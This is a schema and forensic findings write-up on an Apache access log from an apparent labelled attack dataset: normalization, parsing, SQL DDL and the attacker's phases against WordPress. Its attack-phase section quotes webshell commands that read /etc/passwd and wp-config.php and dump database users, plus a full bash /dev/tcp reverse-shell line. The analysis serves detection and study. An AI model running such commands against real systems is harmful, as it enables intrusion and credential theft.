# HTTP Access Log Findings - intranet_server

Source: `russellmitchell/gather/intranet_server/logs/apache2/intranet.smith.russellmitchell.com-access_log.2` (Apache Combined Log Format).
Labels: `russellmitchell/labels/intranet_server/logs/apache2/intranet.smith.russellmitchell.com-access_log.2` (labeled lines, JSON Lines format).
Analysis notebook: `notebooks/03_explore_apache_access.ipynb`.
Target table: `http_access` (16 columns, 8,530 rows).

---

## 1. Normalization Analysis

### 1NF Check

**Multi-valued field — request_line:** The `request_line` TEXT column packs three distinct values into one string: `METHOD path HTTP/version`. The path itself may contain an embedded query string (`/path?key=value`). This is a 1NF violation — three separate atomic values stored in one cell. The notebook extracts `http_method`, `path`, and `http_proto` as separate columns, with `query_string` split further from path.

**Multi-valued field — query_string:** The `query_string` column contains an unparsed key=value string. In the webshell phase, the `wp_meta` value encodes a JSON array of OS commands. Full 1NF resolution would require a separate `request_params` table.

**Repeating groups:** None. No field1, field2, field3 patterns.

**1NF status: violated** in `request_line` (method + path + protocol packed together) and `query_string` (key=value pairs packed into one blob). The parsed columns (`http_method`, `path`, `query_string`) are a partial fix.

### 2NF Check

The table uses a single-column surrogate primary key (`http_access_event_id`). Partial dependencies only arise with composite keys. No composite key exists.

**2NF status: satisfied.**

### 3NF Check

Transitive dependencies identified:

| Determinant | Dependent(s) | Notes |
|---|---|---|
| `request_line` | `http_method`, `path`, `http_proto`, `query_string` | All request-line sub-fields are fully determined by the raw request line. |
| `query_string` | decoded command | The base64-decoded webshell command is entirely determined by the `wp_meta` query parameter. Computed column, not stored in the raw table. |
| `user_agent` | `client_ip` (dataset-specific) | In this log each tool (HeadlessChrome, WPScan, python-requests, Firefox) maps to exactly one source IP. A coincidence of this capture, not a general schema FD. |
| `path` prefix | asset type | WordPress URL conventions make path prefix → asset category a soft FD (wp-includes = core, wp-content/plugins = plugin, wp-content/uploads = user content). |

**3NF status: satisfied** in strict terms — no non-key attribute determines another non-key attribute through a mandatory functional dependency requiring decomposition. The path → asset_type dependency is a denormalization opportunity, not a violation.

### Preliminary Functional Dependencies

| FD | Determinant | Dependent(s) | Reasoning |
|---|---|---|---|
| FD1 | `row_id` | all attributes | Surrogate PK. |
| FD2 | `line_number` | all attributes | Each line number uniquely identifies one log entry within this file. Candidate key. |
| FD3 | `request_line` | `http_method`, `path`, `http_proto`, `query_string` | Structural: the full request line determines all decomposed sub-fields. |
| FD4 | `(client_ip, timestamp)` | all attributes | A client IP at a precise timestamp effectively identifies the row. Candidate composite key. |
| FD5 | `path` prefix | asset type category | WordPress URL conventions make path prefix → asset type a soft FD. |

---

## 2. Field-by-Field Summary

### Core fields

| Field | Notes |
|---|---|
| `row_id` | Surrogate PK, auto-incremented at insert time. |
| `line_number` | Original 1-based line number from the raw Apache log file. Candidate key within this file. |
| `timestamp` | Parsed from `[DD/Mon/YYYY:HH:MM:SS ±ZZZZ]` format. Stored as `TIMESTAMPTZ`. |
| `raw_timestamp` | Raw unparsed timestamp string from the log line, preserved as `VARCHAR(30)`. |
| `client_ip` | IPv4 or IPv6 address of the requesting client. |
| `ident` | RFC 1413 ident field. Always `-` in this log; stored as `NULL` after normalization. |
| `authuser` | HTTP auth username field. Always `-` in this log; stored as `NULL` after normalization. |
| `http_method` | HTTP verb (`GET`, `POST`, `HEAD`, `OPTIONS`). NULL for aborted connections. |
| `path` | URL path component only, split from `request_line` on `?`. |
| `query_string` | Query string component. NULL when no `?` is present. Contains base64-encoded webshell commands in `wp_meta` for webshell records. |
| `http_proto` | HTTP protocol version (`HTTP/1.0`, `HTTP/1.1`). NULL for aborted connections. |
| `status` | 3-digit HTTP response code, cast to `SMALLINT`. |
| `bytes_sent` | Response size in bytes. NULL where the raw log records `-`. |
| `referer` | Referring URL. NULL when raw log records `-`. |
| `user_agent` | Client user-agent string. NULL when raw log records `-`. Distinguishes attack tools (HeadlessChrome, WPScan, python-requests) from legitimate traffic. |
| `request_line` | Full raw `METHOD path HTTP/version` string. Multi-valued (1NF violation) — source of `http_method`, `path`, `http_proto`, `query_string`. |

### Parsing strategy

| Raw log field | Renamed column | Notes |
|---|---|---|
| First token | `client_ip` | IPv4 or IPv6 address |
| Second token | `ident` | RFC 1413; always `-`, stored as NULL |
| Third token | `authuser` | HTTP auth; always `-`, stored as NULL |
| `[DD/Mon/YYYY:HH:MM:SS ±ZZZZ]` | `raw_timestamp` / `timestamp` | Raw string preserved; parsed to TIMESTAMPTZ |
| `"METHOD path HTTP/version"` | `request_line` | Full raw request line |
| Split from request_line | `http_method` | `GET`, `POST`, `HEAD`, etc. |
| Split from request_line on `?` | `path` | Path only, no query string |
| Split from request_line on `?` | `query_string` | NULL if no `?` present |
| Split from request_line | `http_proto` | `HTTP/1.0` or `HTTP/1.1` |
| 3-digit integer | `status` | Cast to SMALLINT |
| Integer or `-` | `bytes_sent` | `-` converted to NULL |
| `"referer"` | `referer` | `-` converted to NULL |
| `"user_agent"` | `user_agent` | `-` converted to NULL |

---

## 3. Client Identity Summary

Five distinct client IPs across 8,530 lines:

| client_ip | Role |
|---|---|
| `172.19.131.174` | Attacker |
| `10.143.2.91` | Legitimate user (Firefox/Ubuntu) |
| `10.143.2.4` | WordPress background cron |
| `10.143.2.25` | Legitimate user (HeadlessChrome/internal) |
| `::1` | Localhost (Apache internal dummy connection) |

User-agent categories distinguish attack tools from legitimate traffic: HeadlessChrome (attacker reconnaissance), WPScan (enumeration), python-requests (exploit and C2), Firefox/Ubuntu (legitimate), WordPress cron, Apache internal.

---

## 4. Attack Phases

All attacker requests originate from `172.19.131.174`. The log captures the full HTTP kill chain across two days.

- **Phase 2 — HeadlessChrome reconnaissance (2022-01-23):** Attacker used a headless browser to browse the site, triggering the wpdiscuz comment plugin and issuing `POST /wp-admin/admin-ajax.php` requests that uploaded the PHP webshell. Blends with legitimate HeadlessChrome traffic from `10.143.2.25`.

- **Phase 3 — WPScan enumeration (2022-01-24 03:54–03:58):** ~8,250 `GET` and `HEAD` requests from `WPScan v3.8.20`. Covers plugin/theme detection, user enumeration (`?author=N`), and media attachment ID enumeration (`?attachment_id=1..100`). Generates the error log burst captured in `http_errors` (DAT-43).

- **Phase 4 — wpdiscuz CVE-2020-24186 file upload exploit (03:58:20):** `POST /wp-admin/admin-ajax.php` via `python-requests/2.27.1`, triggering the upload vulnerability. Webshell `ekmkimzkps-1642996700.9285.php` planted in `wp-content/uploads/2022/01/`.

- **Phase 5 — Webshell C2 (03:58:23–03:59:48):** `GET` requests to the webshell URL with base64+JSON-encoded OS commands in the `wp_meta` query parameter. Commands include `whoami`, `id`, `cat /etc/passwd`, `cat wp-config.php`, `mysql ... select * from wp_users`, `wget` (tool download), and a final reverse shell via `/dev/tcp`.

- **Phase 5 final — Reverse shell callback (04:37:25):** Single `GET` to the webshell issuing `bash -c '0<&196;exec 196<>/dev/tcp/192.168.230.122/47124; sh ...'`.

---

## 5. DDL for Raw Loading

16 columns. Raw 1:1 representation of the Combined Log Format — all fields from the raw line are preserved including `ident` and `authuser` (always `-` but present in the format spec).

```sql
-- PostgreSQL
CREATE TABLE http_access (
    row_id          SERIAL PRIMARY KEY,
    line_number     INT             NOT NULL,
    timestamp       TIMESTAMPTZ,
    raw_timestamp   VARCHAR(30),
    client_ip       INET            NOT NULL,
    ident           VARCHAR(255),
    authuser        VARCHAR(255),
    http_method     VARCHAR(10),
    path            TEXT,
    query_string    TEXT,
    http_proto      VARCHAR(10),
    status          SMALLINT        NOT NULL,
    bytes_sent      BIGINT,
    referer         TEXT,
    user_agent      TEXT,
    request_line    TEXT
);
```

```sql
-- MySQL
CREATE TABLE http_access (
    row_id          INT AUTO_INCREMENT PRIMARY KEY,
    line_number     INT             NOT NULL,
    `timestamp`     DATETIME(6),
    raw_timestamp   VARCHAR(30),
    client_ip       VARCHAR(45)     NOT NULL,
    ident           VARCHAR(255),
    authuser        VARCHAR(255),
    http_method     VARCHAR(10),
    path            TEXT,
    query_string    TEXT,
    http_proto      VARCHAR(10),
    status          SMALLINT        NOT NULL,
    bytes_sent      BIGINT,
    referer         TEXT,
    user_agent      TEXT,
    request_line    TEXT
);
```

---

## 6. Notes for Normalization Phase

1. **1NF violation in `request_line`:** Packs `METHOD path HTTP/version` into one blob. Partially resolved by extracting `http_method`, `path`, `http_proto`, and `query_string` as separate columns. `query_string` itself is still a key=value blob — full 1NF resolution requires a separate `request_params` table.

2. **`ident` and `authuser` are always NULL in this dataset:** Both fields are present in the Combined Log Format spec and captured in the raw table, but every record in this log has `-` for both. They carry no analytical value here but are retained for schema completeness.

3. **`bytes_sent` NULL vs 0:** The raw log uses `-` when no bytes were sent (e.g. HEAD requests, 408 timeouts). Correctly converted to NULL, not 0. NULL should be preserved to distinguish "no response body" from a legitimate zero-byte response.

4. **`bytes_sent` as the highest-fidelity anomaly signal:** Normal page loads return 6,000–80,000 bytes. Webshell C2 responses are consistently ~506,000–570,000 bytes. The condition `bytes_sent > 500000 AND path LIKE '/wp-content/uploads/%.php'` identifies all C2 traffic with zero false positives in this dataset.

5. **`user_agent` as phase boundary detector:** The attacker switches from HeadlessChrome to `python-requests/2.27.1` exactly when the webshell is first invoked (line 8,495). This user-agent switch is a clean phase boundary detectable without content inspection.

6. **`raw_timestamp` preservation:** The raw timestamp string is retained alongside the parsed `TIMESTAMPTZ` to preserve the original timezone offset (`+0000`) and avoid any parsing edge cases during bulk loading.

7. **Merge with error log (DAT-43):** The 37 Apache error log entries fall entirely within the WPScan scan window (03:57–03:58). The `http_access` and `http_errors` tables should share a `host_id` FK and be joinable on `(client_ip, timestamp)`.

8. **Cross-reference with audit log (DAT-42):** Webshell C2 credential dump commands (`cat /etc/passwd`, `mysql ... select * from wp_users`) align by timestamp with the `su` and `sudo` audit events in the intranet audit log. The attacker IP `172.19.131.174` also appears in 3 `USER_LOGIN` audit events.
